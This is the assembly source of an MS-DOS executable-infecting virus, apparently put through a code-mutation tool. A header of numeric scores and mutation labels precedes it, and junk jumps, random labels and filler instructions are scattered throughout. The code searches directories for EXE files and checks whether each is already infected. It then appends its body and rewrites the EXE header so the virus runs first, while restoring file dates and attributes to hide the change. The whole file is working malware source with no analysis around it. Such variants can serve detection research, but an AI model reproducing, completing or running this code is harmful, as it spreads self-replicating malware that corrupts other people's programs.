;0.891667785745
;ForcedJMP_1
;0.798523938005
;		JNZ 	_0
;0.644002759701
;0.519832134261
;0.602476770221
;		JNZ 	_1
;0.658385115502
;0.457694147267
;0.444806315998
;		JNZ 	_0
;0.430869976442
;NoMutation
;0.581246776591
;		JNZ 	_0
;0.670393149438
;		JNZ 	_1
;0.705916086177
;0.521388953107
;		JNZ 	_1
;0.671992284258
;NoMutation
;0.446665403551
;ForcedJMP_0
;0.880010340115
;NoMutation
;0.455307689816
;0.468169550211
;0.68386566998
;0.604321219833
;		JNZ 	_1
;0.658936029106
;UntouchBlock_0
;0.438527045956
;0.555788098382
;0.532212468852
;0.359713744891
;0.501798943794
;ForcedJMP_0
;0.329358124376
;0.656664828516
;ForcedJMP_0
;0.425428733921
;0.48782276144
;UntouchBlock_0
;0.318529731716
;0.455061641414
;UntouchBlock_1
;0.384896040083
;0.521783932893
;0.337103094301
;0.463549202095
;0.323909358254
;ForcedJMP_0
;0.474944318268
;0.363340325319
;UntouchBlock_1
;0.372939190344
;ForcedJMP_0
;0.290931252914
;0.383223246876
;ForcedJMP_0
;0.480266371934
;UntouchBlock_0
;0.400048667559
;0.36348550108
;0.338192283229
;NoMutation
;0.297238824787
;		JZ 	_0
;0.275010413718
;0.319382429846
;UntouchBlock_1
;0.263565942885
;UntouchBlock_1
;0.23759778661
;		JZ 	_0
;0.272640424687
;NoMutation
;0.274884158133
;		JZ 	_1
;0.220828762691
;0.251034628222
;UntouchBlock_1
;0.176873183235
;0.13729936974
;0.203894646395
;UntouchBlock_0
;0.227422327201
;ForcedJMP_0
;0.19110609477
;0.182235924012
;0.185988824664
;0.173876517207
;ForcedJMP_0
;0.129929986568
;0.163590613745
;		JZ 	_1
;0.11489926797
;UntouchBlock_1
;0.0956411399039
;		JNZ 	_0
;0.0563617016228
;0.0474096732495
;		JZ 	_0
;ForcedJMP_0
 		.SEQ ;segments must appear in sequential order
HOSTSEG SEGMENT BYTE
 		ASSUME CS:HOSTSEG,SS:HSTACK
PGMSTR DB ’ABC.EXE’,0
HOST:
	 mov ax,cs 
XQYLS:
	 mov ds,ax
	 mov dx,OFFSET PGMSTR
	 mov ah,41H
YQT_A:
	 int 21H 
	 mov ah,4CH
		JMP 	FY_EQ
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
FY_EQ:
	 mov al,0
IK_VF:
	 int 21H 
HOSTSEG ENDS
HSTACK SEGMENT PARA STACK
db 100H dup (?)
HSTACK ENDS
STACKSIZE EQU 100H 
NUMRELS EQU 2 
VSEG SEGMENT PARA
 	 ASSUME CS:VSEG,DS:VSEG,SS:VSTACK
VIRUSID 	DW 0C8AAH 
OLDDTA 		DD 0 
DTA1 		DB 2BH dup (?) 
DTA2		DB 56H dup (?) 
EXE_HDR 	DB 1CH dup (?) 
EXEFILE 	DB ’\*.EXE’,0 
ALLFILE 	DB ’\*.*’,0 
USEFILE 	DB 78 dup (?) 
LEVEL 		DB 0 
HANDLE 		DW 0 
FATTR 		DB 0 
FTIME 		DW 0 
FDATE 		DW 0 
FSIZE 		DD 0 
VIDC 		DW 0 
VCODE 		DB 1 
JTGBP:
		call 	 VGPVM


VIRUS:
		 push ax
		 mov ax,cs
		 mov ds,ax 						
		JMP 	JTGBP
VGPVM:
		 mov ax,es 						
		 mov WORD PTR [OLDDTA+2],ax 	
		JMP 	OVVFG
ANBST:
		 call SHOULDRUN 				
		 jz   N1
		 JMP  REL1
		 N1: 						
		 call SETSR 
		 call NEW_DTA 					
		 call FIND_FILE 				
		 jz   N2
		 JMP  FINISH 					
		 N2:
		 call SAVE_ATTRIBUTE 			
		 call INFECT 					
		 call REST_ATTRIBUTE 			


FINISH:  call RESTORE_DTA 	
RGXSV:
		call 	 UQVWI
OVVFG:
		call 	 ANBST
 		 pop ax

REL1: 						
 		 mov ax,HSTACK 				
 		 cli 
 		 mov ss,ax

REL1A: 						
 		 mov sp,OFFSET HSTACK
 		 mov es,WORD PTR [OLDDTA+2] 
		 mov ds,WORD PTR [OLDDTA+2] 
 		 sti 					

REL2:					 			
 		jmp FAR PTR HOST 


FIND_FILE:
	mov al,’\’ 
	mov BYTE PTR [USEFILE],al
		JMP 	RGXSV
UQVWI:
	mov si,OFFSET USEFILE+1
	xor dl,dl
	mov ah,47H
	int 21H 
	cmp BYTE PTR [USEFILE+1],0 
	jz  N3
	JMP FF2 
	N3:
	xor al,al 
	mov BYTE PTR [USEFILE],al 

FF2: mov al,2
		JMP 	YYZOO
CZOGH:
	mov [LEVEL],al 
	call FINDBR 
	jnz N4
	JMP FF3 
	N4:
	xor al,al 
	mov BYTE PTR [USEFILE],al 
	inc al 
		JMP 	FCDJW
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
FCDJW:
	mov [LEVEL],al 
YYZOO:
		call 	 CZOGH
	call FINDBR 

FF3:
	ret 

FINDBR:
	call FINDEXE 
	jc  N5
	JMP FBE3 
	N5:
	cmp [LEVEL],0 
	jnz N6
	JMP FBE1 
	N6:
	dec [LEVEL] 
	mov di,OFFSET USEFILE 
	mov si,OFFSET ALLFILE 
		cmp 	ax,dx
JZ QMXYY
JMP MHJJR
QMXYY:
	call CONCAT 
	inc di
	push di 
	call FIRSTDIR 
	jz  N7
	JMP FBE 
MHJJR:
		call 	 QMXYY
	N7:

FB1: 
		pop di 
		xor al,al
		stosb
		mov di,OFFSET USEFILE
		mov bx,OFFSET DTA2+1EH
		mov al,[LEVEL]
		JMP 	WRHKY
ZMTCF:
		mov dl,2BH 
		mul dl 
		add bx,ax 
		mov si,bx
		call CONCAT 
		push di 
		call FINDBR 
		jnz N8
		JMP FBE2 
		N8:
		call NEXTDIR 
		jnz N9
		JMP FB1 
WRHKY:
		call 	 ZMTCF
		N9:

FBE: 
		inc [LEVEL] 
		pop di 
		xor al,al 
		stosb

FBE1: mov al,1 
	or al,al
BTUV_:
		call 	 SQZOZ
LEJCE:
		call 	 WBXLK
	ret

M_PEP:
		call 	 TYOKE
FBE2: pop di 

FBE3: xor al,al 
 	  ret 


FINDEXE:
		mov dx,OFFSET DTA1 
		JMP 	LEJCE
WBXLK:
		mov ah,1AH
		int 21H
		JMP 	XSLRT
nop
nop
nop
nop
XSLRT:
		mov di,OFFSET USEFILE
		JMP 	BTUV_
SQZOZ:
		mov si,OFFSET EXEFILE
		call CONCAT 
		push di 
		mov dx,OFFSET USEFILE
		cmp 	dx,bx
JNZ NJBQT
JMP CGTUP
NJBQT:
		mov cx,3FH 
		mov ah,4EH
JNZ TYOKE
JMP M_PEP
TYOKE:
CGTUP:
		call 	 NJBQT
		int 21H

NEXTEXE:
		or al,al 
		jz N10
		JMP FEC 
		N10:
		pop di
		inc di
		stosb 
		mov di,OFFSET USEFILE
		JMP 	VEDXB
UPVHZ:
		mov si,OFFSET DTA1+1EH
		call CONCAT 
		dec di
		push di
		call FILE_OK 
		jc N11
		JMP FENC 
		N11:
		mov ah,4FH
		int 21H 
		jmp SHORT NEXTEXE 

FEC: 
	 pop di
 	 mov BYTE PTR [di],0 
		JMP 	HDLUM
DAMFN:
	 stc
VEDXB:
		call 	 UPVHZ
	 ret

FENC:
	 pop di
	 ret
HDLUM:
		call 	 DAMFN


FIRSTDIR:
	 call GET_DTA
	 push dx 
	 mov ah,1AH 
	 int 21H
	 mov dx,OFFSET USEFILE
	 mov cx,10H 
		JMP 	TAMVS
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
TAMVS:
	 mov ah,4EH 
	 int 21H

NEXTD1:
	 pop bx 
	 or al,al 
	 jz N12
	 JMP NEXTD3 
	 N12:
	 test BYTE PTR [bx+15H],10H 
	 jnz N13
	 JMP NEXTDIR 
	 N13:
	 cmp BYTE PTR [bx+1EH],’.’ 
	 je N14
	 JMP NEXTD2 
	 N14:
	 
NEXTDIR: 
	 call GET_DTA 
	 push dx
	 mov ah,1AH 
		cmp 	bx,cx
JNZ DCB_F
JMP WKFDN
DCB_F:
	 int 21H
	 mov ah,4FH
	 int 21H 
	 jmp NEXTD1 ;SHORT NEXTD1 -- uncomment for short jump

NEXTD2:
 	 xor al,al 

NEXTD3:
NEJVW:
		call 	 DAKKH
	 ret 


GET_DTA:
 mov dx,OFFSET DTA2
 mov al,2BH
 mul [LEVEL]
 add dx,ax 
WKFDN:
		call 	 DCB_F
 ret


CONCAT:
	 mov al,byte ptr es:[di] 
JZ DAKKH
JMP NEJVW
DAKKH:
	 inc di
	 or al,al
	 jnz CONCAT ;unmodified code be careful rit
	 dec di 
	 push di 

CONCAT2:
	 cld
	 lodsb 
	 stosb
	 or al,al
	 jnz CONCAT2 ;unmodified code be careful rit
	 pop di 
CGIBU:
		call 	 YUABV
	 ret 	 


FILE_OK:
	 call GET_EXE_HEADER 
	 jnc N15
	 JMP OK_END 
	 N15:
	 call CHECK_SIG_OVERLAY 
	 jnc N16
	 JMP OK_END 
	 N16:
	 call REL_ROOM 
	 jnc N17
	 JMP OK_END 
	 N17:
	 call IS_ID_THERE 

OK_END: ret 	 


CHECK_SIG_OVERLAY:
		 mov al,’M’ 
		cmp 	bx,ax
JZ YUABV
JMP CGIBU
YUABV:
		 mov ah,’Z’
		cmp 	cx,dx
JZ _S_VU
JMP __URP
_S_VU:
		 cmp ax,WORD PTR [EXE_HDR]
		 jnz N18
		 JMP CSO_1
		 N18:
		 stc 
		 ret

CSO_1: 	 xor ax,ax
	     sub ax,WORD PTR [EXE_HDR+26]
__URP:
		call 	 _S_VU
	     ret 


GET_EXE_HEADER:
	 mov dx,OFFSET USEFILE
		JMP 	CLKL_
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
CLKL_:
	 mov ax,3D02H 
JNZ ERSQN
JMP PJWOK
ERSQN:
	 int 21H
	 jnc N19
	 JMP RE_RET 
	 N19:
	 mov [HANDLE],ax 
	 mov bx,ax 
	 mov cx,1CH 
	 mov dx,OFFSET EXE_HDR 
	 mov ah,3FH
	 int 21H

PJWOK:
		call 	 ERSQN
RE_RET: ret 


REL_ROOM:
	 mov ax,WORD PTR [EXE_HDR+8] 
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+6] 
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+24] 
PMBXO:
		call 	 OHKPG
	 cmp ax,4*NUMRELS 

RR_RET: ret     


IS_ID_THERE:
	 mov ax,WORD PTR [EXE_HDR+22] 
	 add ax,WORD PTR [EXE_HDR+8] 
	 mov dx,16
		cmp 	dx,bx
JZ OHKPG
JMP PMBXO
OHKPG:
	 mul dx
	 mov cx,dx
	 mov dx,ax 
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov ah,3FH
	 mov bx,[HANDLE]
		JMP 	SEST_
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
SEST_:
	 mov dx,OFFSET VIDC
	 mov cx,2 
		JMP 	GZIZC
YMC_B:
	 int 21H
	 jnc N20
	 JMP II_RET 
	 N20:
	 mov ax,[VIDC]
	 cmp ax,[VIRUSID] 
	 clc
	 jz N21
	 JMP II_RET 
	 N21:
GZIZC:
		call 	 YMC_B
	 stc 

II_RET: ret


SETBDY:
	 mov al,BYTE PTR [FSIZE]
		cmp 	bx,bx
JNZ NGQSG
JMP MBT_D
NGQSG:
	 and al,0FH 
	 jnz N22
	 JMP SB_E 
	 N22:
	 mov cx,10H 
	 sub cl,al 
	 mov dx,OFFSET FINAL
	 add WORD PTR [FSIZE],cx 
	 adc WORD PTR [FSIZE+2],0
	 mov bx,[HANDLE]
	 mov ah,40H 
UJNNJ:
		call 	 CVNAK
	 int 21H

MBT_D:
		call 	 NGQSG
SB_E: ret
WSWGS:
		call 	 MNVLI


INFECT:
	 mov cx,WORD PTR [FSIZE+2]
	 mov dx,WORD PTR [FSIZE]
	 mov bx,[HANDLE]
	 mov ax,4200H 
JZ CVNAK
JMP UJNNJ
CVNAK:
	 int 21H 
	 call SETBDY 
	 mov cx,OFFSET FINAL 
	 xor dx,dx 
	 mov bx,[HANDLE] 
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE] 
	 mov cx,WORD PTR [FSIZE+2]
		JMP 	ZIDCS
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
ZIDCS:
	 mov bx,OFFSET REL1 
	 inc bx
	 add dx,bx
	 mov bx,0
	 adc cx,bx 
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+14 
		cmp 	cx,bx
JNZ MNVLI
JMP WSWGS
MNVLI:
	 mov bx,[HANDLE] 
	 mov cx,2
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE]
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL1A 
	 inc bx 
	 add dx,bx
	 mov bx,0
	 adc cx,bx 
	 mov bx,[HANDLE]
		JMP 	OFK_U
xor bx,cx
OFK_U:
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+16 
	 mov bx,[HANDLE] 
	 mov cx,2
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE]
	 mov cx,WORD PTR [FSIZE+2]
JLMZM:
	 mov bx,OFFSET REL2 
	 add bx,1 
	 add dx,bx
	 mov bx,0
	 adc cx,bx 
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+20 
	 mov bx,[HANDLE]
	 mov cx,4
	 mov ah,40H 
QLJNK:
	 int 21H
	 xor cx,cx
	 xor dx,dx
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov ax,WORD PTR [FSIZE] 
	 mov cl,4 
	 shr ax,cl 
	 mov bx,WORD PTR [FSIZE+2]
	 and bl,0FH
	 mov cl,4
	 shl bl,cl
	 add ah,bl
	 sub ax,WORD PTR [EXE_HDR+8] 
	 mov WORD PTR [EXE_HDR+22],ax
	 mov bx,OFFSET FINAL 
PAPK_:
	 add bx,10H 
	 mov cl,4 
	 shr bx,cl
	 add ax,bx
		JMP 	NPMGL
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
NPMGL:
	 mov WORD PTR [EXE_HDR+14],ax 
	 mov ax,OFFSET VIRUS 
	 mov WORD PTR [EXE_HDR+20],ax 
	 mov ax,STACKSIZE 
	 mov WORD PTR [EXE_HDR+16],ax ;and save it
	 mov dx,WORD PTR [FSIZE+2]
	 mov ax,WORD PTR [FSIZE] 
	 mov bx,OFFSET FINAL
	 add ax,bx
	 xor bx,bx
	 adc dx,bx 
	 add ax,200H 
	 adc dx,bx
	 push ax
	 mov cl,9
	 shr ax,cl
	 mov cl,7
	 shl dx,cl
	 add ax,dx
	 mov WORD PTR [EXE_HDR+4],ax 
	 pop ax
	 and ax,1FFH 
	 mov WORD PTR [EXE_HDR+2],ax 
	 mov ax,NUMRELS 
	 add WORD PTR [EXE_HDR+6],ax
	 mov cx,1CH 
	 mov dx,OFFSET EXE_HDR
	 mov bx,[HANDLE]
	 mov ah,40H 
	 int 21H
	 mov ax,WORD PTR [EXE_HDR+6] 
AHCJU:
	 dec ax 
	 dec ax 
	 mov bx,4 
	 mul bx
	 add ax,WORD PTR [EXE_HDR+24]
	 mov bx,0
	 adc dx,bx 
	 mov cx,dx
	 mov dx,ax
BZKVZ:
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov ax,WORD PTR [EXE_HDR+22]
	 mov bx,OFFSET REL1 
	 inc bx 
	 mov WORD PTR [EXE_HDR],bx 
	 mov WORD PTR [EXE_HDR+2],ax 
	 mov ax,WORD PTR [EXE_HDR+22]
	 mov bx,OFFSET REL2
	 add bx,3 
	 mov WORD PTR [EXE_HDR+4],bx 
	 mov WORD PTR [EXE_HDR+6],ax
	 mov cx,8 
	 mov dx,OFFSET EXE_HDR
	 mov bx,[HANDLE]
		JMP 	MDCPJ
ZOTGU:
	 mov ah,40H 
	 int 21H
	 ret 



TIMECT EQU 63 
MDCPJ:
		call 	 ZOTGU


SHOULDRUN:
	 xor ah,ah 

SR1: ret 
 	 int 1AH
 	 and dl,TIMECT 
 	 ret ;



SETSR:
	 mov al,90H 
		JMP 	TEKTF
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
TEKTF:
	 mov BYTE PTR SR1,al 
	 ret


NEW_DTA:
	 mov ah,2FH 
	 int 21H
		JMP 	ZBFGW
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
ZBFGW:
	 mov WORD PTR [OLDDTA],bx
	 mov ax,es
	 mov WORD PTR [OLDDTA+2],ax
	 mov ax,cs
	 mov es,ax 
	 mov dx,OFFSET DTA1 
	 mov ah,1AH
	 int 21H 
	 ret

RESTORE_DTA:
	 mov dx,WORD PTR [OLDDTA] 
	 mov ax,WORD PTR [OLDDTA+2]
	 mov ds,ax
	 mov ah,1AH
	 int 21H 
	 mov ax,cs 
	 mov ds,ax
	 ret	 

SAVE_ATTRIBUTE:
	 mov ah,43H 
	 mov al,0
	 mov dx,OFFSET USEFILE
	 int 21H
	 mov [FATTR],cl 
	 mov ah,43H
	 mov al,1
	 mov dx,OFFSET USEFILE
	 mov cl,0
	 int 21H
	 mov dx,OFFSET USEFILE
	 mov al,2 
	 mov ah,3DH 
	 int 21H
	 mov [HANDLE],ax 
	 mov ah,57H 
	 xor al,al
	 mov bx,[HANDLE]
	 int 21H
	 mov [FTIME],cx 
	 mov [FDATE],dx 
	 mov ax,WORD PTR [DTA1+28] 
	 mov WORD PTR [FSIZE+2],ax 
	 mov ax,WORD PTR [DTA1+26] 
	 mov WORD PTR [FSIZE],ax
 	 ret

ABTCL:
		call 	 UO_VT


REST_ATTRIBUTE:
	 mov dx,[FDATE] 
	 mov cx,[FTIME]
	 mov ah,57H 
		JMP 	FFOPU
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
FFOPU:
	 mov al,1
QVFCB:
		cmp 	cx,ax
JZ NYCDV
JMP QPUCI
NYCDV:
	 mov bx,[HANDLE]
	 int 21H
	 mov ah,3EH
		cmp 	cx,bx
JZ UO_VT
JMP ABTCL
UO_VT:
	 mov bx,[HANDLE]
	 int 21H
	 mov cl,[FATTR]
	 xor ch,ch
	 mov ah,43H 
	 mov al,1
	 mov dx,OFFSET USEFILE
	 int 21H
QPUCI:
		call 	 NYCDV
	 ret

FINAL: 

VSEG ENDS 	 

VSTACK SEGMENT PARA STACK
 	   db STACKSIZE dup (?)
VSTACK ENDS
	   END VIRUS 
